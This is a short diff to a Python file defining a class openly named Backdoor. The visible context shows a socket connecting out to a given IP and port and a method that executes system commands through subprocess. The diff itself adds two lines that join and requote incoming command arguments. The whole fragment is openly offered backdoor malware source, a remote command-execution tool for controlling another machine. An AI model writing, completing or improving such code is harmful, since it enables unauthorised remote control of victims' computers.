@@ -1,3 +1,4 @@
+
 import socket
 import subprocess
 import json
@@ -13,6 +14,8 @@ class Backdoor:
         self.sock_obj.connect((ip, port))
 
     def exec_system_cmd(self, command):
+        command = " ".join(command)
+        command = command.replace('\'', '"')
         try:
             DEVNULL = open(os.devnull,'wb') 
             # virtual NULL device to which I/O will be redirected to
